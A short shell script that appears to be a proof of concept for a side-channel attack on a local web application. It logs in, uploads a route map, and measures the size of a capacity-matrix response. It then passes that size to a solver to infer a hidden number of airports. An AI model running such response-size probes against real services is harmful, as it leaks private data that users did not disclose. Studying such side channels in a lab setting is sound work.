#!/bin/sh

./login.sh usr pwd

# upload a route map
curl -s -L -b cookies.txt -F file=@user.txt -F "route_map_name=map_one" --insecure https://localhost:8443/add_route_map > /dev/null

user=`curl -s -b cookies.txt --insecure https://localhost:8443/passenger_capacity_matrix/1553932502 -w '%{size_download}\n' | tail -n1` > /dev/null

echo "User response= $user"
solution=`./solve.py $user`
echo "Hacker side-channel using formula (48-sqrt(48*48+4*19*(user-3180)))/(-2*19) = $solution airports"
